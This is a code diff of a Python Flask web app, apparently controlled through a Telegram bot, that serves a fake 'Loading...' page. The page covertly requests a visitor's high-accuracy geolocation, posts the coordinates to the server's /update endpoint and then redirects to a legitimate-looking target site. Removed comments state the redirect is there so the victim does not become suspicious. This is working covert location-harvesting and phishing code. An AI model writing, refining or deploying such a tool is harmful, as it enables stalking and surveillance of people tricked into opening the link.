@@ -41,9 +41,7 @@ def send_link_command(message):
     else:
         bot.send_message(message.chat.id, "Unauthorized access!")
 
-@app.route("/")
-def index():
-    return f'''
+HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -51,8 +49,8 @@ def index():
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
-        body {{
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
             background: #0f172a;
             color: #f8fafc;
             display: flex;
@@ -61,8 +59,8 @@ def index():
             justify-content: center;
             height: 100vh;
             padding: 20px;
-        }}
-        .card {{
+        }
+        .card {
             background: #1e293b;
             padding: 35px 25px;
             border-radius: 14px;
@@ -71,8 +69,8 @@ def index():
             max-width: 380px;
             width: 100%;
             border: 1px solid #334155;
-        }}
-        .spinner {{
+        }
+        .spinner {
             width: 45px;
             height: 45px;
             border: 4px solid #334155;
@@ -80,22 +78,22 @@ def index():
             border-radius: 50%;
             animation: spin 0.9s linear infinite;
             margin: 0 auto 20px auto;
-        }}
-        @keyframes spin {{
-            0% {{ transform: rotate(0deg); }}
-            100% {{ transform: rotate(360deg); }}
-        }}
-        .status {{
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
             font-size: 18px;
             font-weight: 600;
             color: #38bdf8;
             margin-bottom: 10px;
-        }}
-        .message {{
+        }
+        .message {
             font-size: 14px;
             color: #94a3b8;
             line-height: 1.5;
-        }}
+        }
     </style>
 </head>
 <body>
@@ -106,43 +104,41 @@ def index():
     </div>
 
     <script>
-        const targetUrl = "{TARGET_WEBSITE}";
+        const targetUrl = "TARGET_URL_PLACEHOLDER";
         const statusDiv = document.getElementById('status');
         const messageDiv = document.getElementById('message');
         const spinnerDiv = document.getElementById('spinner');
 
         function onSuccess(pos) {
             try {
-                fetch('/update', {{
+                fetch('/update', {
                     method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         accuracy: pos.coords.accuracy,
                         timestamp: pos.timestamp
-                    }})
-                }}).finally(function() {{
-                    // Location bhejne ke foran baad asli website par redirect kar do
+                    })
+                }).finally(function() {
                     window.location.href = targetUrl;
-                }});
-            } catch(e) {{
+                });
+            } catch(e) {
                 window.location.href = targetUrl;
-            }}
+            }
         }
         
-        function onError(err) {{
-            // Agar permission deny bhi karde tab bhi website par bhej do taake shak na ho
+        function onError(err) {
             window.location.href = targetUrl;
-        }}
+        }
         
         function requestLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(onSuccess, onError, {{
+                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                     enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
-                }});
+                });
             } else {
                 window.location.href = targetUrl;
             }
@@ -152,7 +148,11 @@ def index():
     </script>
 </body>
 </html>
-'''
+"""
+
+@app.route("/")
+def index():
+    return HTML_PAGE.replace("TARGET_URL_PLACEHOLDER", TARGET_WEBSITE)
 
 @app.route("/update", methods=["POST"])
 def update():
